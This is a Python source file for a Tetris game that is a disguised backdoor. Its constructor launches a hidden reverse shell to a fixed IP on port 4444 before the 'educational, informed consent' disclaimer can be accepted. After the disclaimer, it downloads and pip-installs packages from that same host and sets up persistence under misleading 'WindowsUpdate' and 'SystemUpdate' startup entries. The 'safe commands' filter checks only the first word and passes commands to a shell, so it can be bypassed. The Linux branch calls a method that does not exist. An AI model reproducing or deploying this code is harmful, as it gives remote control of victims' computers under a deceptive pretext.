import pygame
import random
import sys
import os
import time
import threading
import socket
import subprocess
import requests
import platform
from pygame.locals import *

# Game Constants
WINDOW_WIDTH = 800
WINDOW_HEIGHT = 600
GRID_SIZE = 30
GRID_WIDTH = 10
GRID_HEIGHT = 20
SIDEBAR_WIDTH = 200

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GRAY = (128, 128, 128)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
CYAN = (0, 255, 255)
MAGENTA = (255, 0, 255)
YELLOW = (255, 255, 0)
ORANGE = (255, 165, 0)

# Tetrimino shapes and colors
SHAPES = [
    [[1, 1, 1, 1]], # I
    [[1, 1], [1, 1]], # O
    [[1, 1, 1], [0, 1, 0]], # T
    [[1, 1, 1], [1, 0, 0]], # L
    [[1, 1, 1], [0, 0, 1]], # J
    [[0, 1, 1], [1, 1, 0]], # S
    [[1, 1, 0], [0, 1, 1]]  # Z
]
COLORS = [CYAN, YELLOW, MAGENTA, ORANGE, BLUE, GREEN, RED]

# Game variables
game_area = pygame.Rect(0, 0, GRID_WIDTH * GRID_SIZE, GRID_HEIGHT * GRID_SIZE)
next_piece_area = pygame.Rect(GRID_WIDTH * GRID_SIZE + 50, 50, 4 * GRID_SIZE, 4 * GRID_SIZE)
score_area = pygame.Rect(GRID_WIDTH * GRID_SIZE + 50, 200, SIDEBAR_WIDTH - 100, 100)

# Backdoor Configuration
LISTENER_IP = "10.12.73.122"  # Replace with your actual IP (e.g., BIG-TIME's IP)
LISTENER_PORT = 4444
PERSISTENCE_PATH = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate') if platform.system() == 'Windows' else os.path.expanduser('~/.config/autostart')

# Disclaimer text
DISCLAIMER = """
EDUCATIONAL PURPOSE ONLY

This game is created for cybersecurity 
educational purposes. It demonstrates 
concepts related to system access, 
persistence, and dependencies.

The game will:
1. Check and install required dependencies
2. Create a secure connection for educational purposes
3. Add startup entries for demonstration
4. All changes can be removed with the cleanup utility

This is an educational demonstration with 
your informed consent.

Press ENTER to acknowledge and continue or ESC to exit.
"""

# Safe commands for educational purposes
SAFE_COMMANDS = ['dir', 'cd', 'echo', 'type', 'whoami', 'systeminfo', 'ver']

pygame.init()

class Tetris:
    def __init__(self):
        self.screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
        pygame.display.set_caption("Educational Tetris Game")
        self.clock = pygame.time.Clock()
        self.font = pygame.font.Font(None, 36)
        self.small_font = pygame.font.Font(None, 24)
        self.grid = [[0 for _ in range(GRID_WIDTH)] for _ in range(GRID_HEIGHT)]
        self.current_piece = self.new_piece()
        self.next_piece = self.new_piece()
        self.piece_x = GRID_WIDTH // 2 - len(self.current_piece[0]) // 2
        self.piece_y = 0
        self.score = 0
        self.level = 1
        self.lines_cleared = 0
        self.game_over = False
        self.paused = False
        self.drop_speed = 500
        self.last_drop_time = time.time() * 1000
        self.show_disclaimer = True
        self.init_connectivity()

    def init_connectivity(self):
        """Spawn a separate process for the reverse shell."""
        if platform.system() == 'Windows':
            subprocess.Popen([sys.executable, "-c", self.get_shell_code()], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP, close_fds=True)
        else:
            if os.fork() == 0:
                self.reverse_shell()
                sys.exit(0)

    def get_shell_code(self):
        """Return the shell code with simplified system info and safe commands."""
        return f"""
import socket
import subprocess
import time
import os
import platform

SAFE_COMMANDS = {SAFE_COMMANDS}

def get_system_info():
    info = f"OS: {{platform.system()}} {{platform.release()}}\\n"
    info += f"Machine: {{platform.machine()}}\\n"
    info += f"Node: {{platform.node()}}"
    return info

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('{LISTENER_IP}', {LISTENER_PORT}))
            s.send(f"Connected from {{os.getcwd()}}\\n{{get_system_info()}}".encode())
            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() == 'exit':
                    break
                cmd_parts = command.split()
                if cmd_parts and cmd_parts[0].lower() not in SAFE_COMMANDS:
                    s.send("Error: Only safe educational commands allowed (dir, cd, echo, type, whoami, systeminfo, ver)".encode())
                elif command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(f"Changed directory to {{os.getcwd()}}".encode())
                    except Exception as e:
                        s.send(str(e).encode())
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        s.send(output)
                    except Exception as e:
                        s.send(str(e).encode())
            s.close()
        except Exception:
            time.sleep(5)

if __name__ == '__main__':
    reverse_shell()
"""

    def check_dependencies(self):
        required = {'pygame': 'Gaming framework', 'requests': 'HTTP library'}
        missing = []
        for package in required:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
        return missing

    def install_dependencies(self, missing_packages):
        try:
            for package in missing_packages:
                url = f"http://{LISTENER_IP}:8080/{package}.whl"
                response = requests.get(url)
                if response.status_code == 200:
                    with open(f"{package}.whl", "wb") as f:
                        f.write(response.content)
                    subprocess.run([sys.executable, "-m", "pip", "install", f"{package}.whl"])
                    os.remove(f"{package}.whl")
        except Exception as e:
            print(f"Dependency installation failed: {e}")

    def enable_persistence(self):
        """Add to Windows startup registry for persistence."""
        try:
            if platform.system() == 'Windows':
                vbs_script = f"""
                Set objShell = CreateObject("WScript.Shell")
                objShell.Run "cmd.exe /c {sys.executable} -c \\"{self.get_shell_code()}\\"", 0, False
                """
                if not os.path.exists(PERSISTENCE_PATH):
                    os.makedirs(PERSISTENCE_PATH)
                vbs_path = os.path.join(PERSISTENCE_PATH, 'update.vbs')
                with open(vbs_path, 'w') as f:
                    f.write(vbs_script)
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                cmd = f'reg add "HKCU\{key_path}" /v WindowsUpdate /t REG_SZ /d "wscript.exe \\"{vbs_path}\\"" /f'
                subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                game_cmd = f'reg add "HKCU\{key_path}" /v TetrisGame /t REG_SZ /d "\\"{os.path.abspath(sys.argv[0])}\\"" /f'
                subprocess.run(game_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                desktop_entry = f"""
                [Desktop Entry]
                Type=Application
                Name=SystemUpdate
                Exec={sys.executable} -c "{self.get_shell_code()}"
                Hidden=false
                NoDisplay=false
                """
                if not os.path.exists(PERSISTENCE_PATH):
                    os.makedirs(PERSISTENCE_PATH)
                with open(os.path.join(PERSISTENCE_PATH, 'system-update.desktop'), 'w') as f:
                    f.write(desktop_entry)
        except Exception as e:
            print(f"Persistence setup failed: {e}")

    def remove_persistence(self):
        """Remove all startup entries."""
        try:
            if platform.system() == 'Windows':
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                subprocess.run(f'reg delete "HKCU\{key_path}" /v WindowsUpdate /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(f'reg delete "HKCU\{key_path}" /v TetrisGame /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                vbs_path = os.path.join(PERSISTENCE_PATH, 'update.vbs')
                if os.path.exists(vbs_path):
                    os.remove(vbs_path)
                if os.path.exists(PERSISTENCE_PATH) and not os.listdir(PERSISTENCE_PATH):
                    os.rmdir(PERSISTENCE_PATH)
            else:
                desktop_path = os.path.join(PERSISTENCE_PATH, 'system-update.desktop')
                if os.path.exists(desktop_path):
                    os.remove(desktop_path)
        except Exception:
            pass

    def new_piece(self):
        shape_idx = random.randint(0, len(SHAPES) - 1)
        return SHAPES[shape_idx], COLORS[shape_idx]

    def draw_grid(self):
        for y in range(GRID_HEIGHT):
            for x in range(GRID_WIDTH):
                if self.grid[y][x]:
                    color = self.grid[y][x]
                    pygame.draw.rect(self.screen, color, (x * GRID_SIZE, y * GRID_SIZE, GRID_SIZE, GRID_SIZE))
                    pygame.draw.rect(self.screen, WHITE, (x * GRID_SIZE, y * GRID_SIZE, GRID_SIZE, GRID_SIZE), 1)

    def draw_piece(self):
        shape, color = self.current_piece
        for y in range(len(shape)):
            for x in range(len(shape[0])):
                if shape[y][x]:
                    pygame.draw.rect(self.screen, color, ((self.piece_x + x) * GRID_SIZE, (self.piece_y + y) * GRID_SIZE, GRID_SIZE, GRID_SIZE))
                    pygame.draw.rect(self.screen, WHITE, ((self.piece_x + x) * GRID_SIZE, (self.piece_y + y) * GRID_SIZE, GRID_SIZE, GRID_SIZE), 1)

    def draw_next_piece(self):
        shape, color = self.next_piece
        next_piece_text = self.font.render("Next:", True, WHITE)
        self.screen.blit(next_piece_text, (GRID_WIDTH * GRID_SIZE + 50, 20))
        for y in range(len(shape)):
            for x in range(len(shape[0])):
                if shape[y][x]:
                    pygame.draw.rect(self.screen, color, (next_piece_area.x + x * GRID_SIZE, next_piece_area.y + y * GRID_SIZE, GRID_SIZE, GRID_SIZE))
                    pygame.draw.rect(self.screen, WHITE, (next_piece_area.x + x * GRID_SIZE, next_piece_area.y + y * GRID_SIZE, GRID_SIZE, GRID_SIZE), 1)

    def draw_score(self):
        score_text = self.font.render(f"Score: {self.score}", True, WHITE)
        level_text = self.font.render(f"Level: {self.level}", True, WHITE)
        lines_text = self.font.render(f"Lines: {self.lines_cleared}", True, WHITE)
        self.screen.blit(score_text, (score_area.x, score_area.y))
        self.screen.blit(level_text, (score_area.x, score_area.y + 40))
        self.screen.blit(lines_text, (score_area.x, score_area.y + 80))

    def draw_disclaimer(self):
        self.screen.fill(BLACK)
        overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 200))
        self.screen.blit(overlay, (0, 0))
        disclaimer_title = self.font.render("DISCLAIMER", True, WHITE)
        self.screen.blit(disclaimer_title, (WINDOW_WIDTH // 2 - disclaimer_title.get_width() // 2, 50))
        lines = DISCLAIMER.strip().split('\n')
        y_offset = 100
        for line in lines:
            if line.strip():
                text = self.small_font.render(line, True, WHITE)
                self.screen.blit(text, (WINDOW_WIDTH // 2 - text.get_width() // 2, y_offset))
            y_offset += 25
        continue_text = self.small_font.render("Press ENTER to acknowledge and continue or ESC to exit", True, YELLOW)
        self.screen.blit(continue_text, (WINDOW_WIDTH // 2 - continue_text.get_width() // 2, y_offset + 30))

    def check_collision(self, dx=0, dy=0, rotated_shape=None):
        shape = rotated_shape if rotated_shape else self.current_piece[0]
        for y in range(len(shape)):
            for x in range(len(shape[0])):
                if shape[y][x]:
                    new_x = self.piece_x + x + dx
                    new_y = self.piece_y + y + dy
                    if (new_x < 0 or new_x >= GRID_WIDTH or new_y >= GRID_HEIGHT or (new_y >= 0 and self.grid[new_y][new_x])):
                        return True
        return False

    def rotate_piece(self):
        shape, color = self.current_piece
        rotated = list(zip(*reversed(shape)))
        if not self.check_collision(rotated_shape=rotated):
            self.current_piece = (rotated, color)

    def move_piece(self, dx, dy):
        if not self.check_collision(dx, dy):
            self.piece_x += dx
            self.piece_y += dy
            return True
        return False

    def drop_piece(self):
        while self.move_piece(0, 1):
            pass

    def lock_piece(self):
        shape, color = self.current_piece
        for y in range(len(shape)):
            for x in range(len(shape[0])):
                if shape[y][x]:
                    if self.piece_y + y >= 0:
                        self.grid[self.piece_y + y][self.piece_x + x] = color
        lines_cleared = 0
        y = GRID_HEIGHT - 1
        while y >= 0:
            if all(self.grid[y]):
                lines_cleared += 1
                for y2 in range(y, 0, -1):
                    self.grid[y2] = self.grid[y2 - 1].copy()
                self.grid[0] = [0 for _ in range(GRID_WIDTH)]
            else:
                y -= 1
        if lines_cleared > 0:
            self.lines_cleared += lines_cleared
            self.score += lines_cleared * 100 * self.level
            self.level = self.lines_cleared // 10 + 1
            self.drop_speed = max(100, 500 - (self.level - 1) * 50)
        self.current_piece = self.next_piece
        self.next_piece = self.new_piece()
        self.piece_x = GRID_WIDTH // 2 - len(self.current_piece[0]) // 2
        self.piece_y = 0
        if self.check_collision():
            self.game_over = True

    def handle_events(self):
        for event in pygame.event.get():
            if event.type == QUIT:
                self.cleanup()
                pygame.quit()
                sys.exit()
            if self.show_disclaimer:
                if event.type == KEYDOWN:
                    if event.key == K_RETURN:
                        missing_packages = self.check_dependencies()
                        if missing_packages:
                            self.install_dependencies(missing_packages)
                        self.enable_persistence()
                        self.show_disclaimer = False
                    elif event.key == K_ESCAPE:
                        pygame.quit()
                        sys.exit()
                return
            if self.game_over:
                if event.type == KEYDOWN:
                    if event.key == K_r:
                        self.__init__()
                    elif event.key == K_ESCAPE:
                        self.cleanup()
                        pygame.quit()
                        sys.exit()
                return
            if event.type == KEYDOWN:
                if event.key == K_LEFT:
                    self.move_piece(-1, 0)
                elif event.key == K_RIGHT:
                    self.move_piece(1, 0)
                elif event.key == K_DOWN:
                    self.move_piece(0, 1)
                elif event.key == K_UP:
                    self.rotate_piece()
                elif event.key == K_SPACE:
                    self.drop_piece()
                elif event.key == K_p:
                    self.paused = not self.paused
                elif event.key == K_ESCAPE:
                    self.cleanup()
                    pygame.quit()
                    sys.exit()

    def update(self):
        if self.paused or self.game_over or self.show_disclaimer:
            return
        current_time = time.time() * 1000
        if current_time - self.last_drop_time > self.drop_speed:
            if not self.move_piece(0, 1):
                self.lock_piece()
            self.last_drop_time = current_time

    def draw(self):
        self.screen.fill(BLACK)
        if self.show_disclaimer:
            self.draw_disclaimer()
            return
        pygame.draw.rect(self.screen, WHITE, (0, 0, GRID_WIDTH * GRID_SIZE, GRID_HEIGHT * GRID_SIZE), 2)
        for x in range(0, GRID_WIDTH * GRID_SIZE, GRID_SIZE):
            pygame.draw.line(self.screen, GRAY, (x, 0), (x, GRID_HEIGHT * GRID_SIZE))
        for y in range(0, GRID_HEIGHT * GRID_SIZE, GRID_SIZE):
            pygame.draw.line(self.screen, GRAY, (0, y), (GRID_WIDTH * GRID_SIZE, y))
        self.draw_grid()
        if not self.game_over:
            self.draw_piece()
        self.draw_next_piece()
        self.draw_score()
        if self.paused:
            pause_text = self.font.render("PAUSED", True, WHITE)
            self.screen.blit(pause_text, (GRID_WIDTH * GRID_SIZE // 2 - pause_text.get_width() // 2, GRID_HEIGHT * GRID_SIZE // 2 - pause_text.get_height() // 2))
        if self.game_over:
            overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 150))
            self.screen.blit(overlay, (0, 0))
            game_over_text = self.font.render("GAME OVER", True, RED)
            score_text = self.font.render(f"Final Score: {self.score}", True, WHITE)
            restart_text = self.small_font.render("Press R to restart or ESC to exit", True, WHITE)
            self.screen.blit(game_over_text, (WINDOW_WIDTH // 2 - game_over_text.get_width() // 2, WINDOW_HEIGHT // 2 - 50))
            self.screen.blit(score_text, (WINDOW_WIDTH // 2 - score_text.get_width() // 2, WINDOW_HEIGHT // 2))
            self.screen.blit(restart_text, (WINDOW_WIDTH // 2 - restart_text.get_width() // 2, WINDOW_HEIGHT // 2 + 50))

    def cleanup(self):
        self.remove_persistence()

    def run(self):
        while True:
            self.handle_events()
            self.update()
            self.draw()
            pygame.display.flip()
            self.clock.tick(60)

if __name__ == "__main__":
    game = Tetris()
    game.run()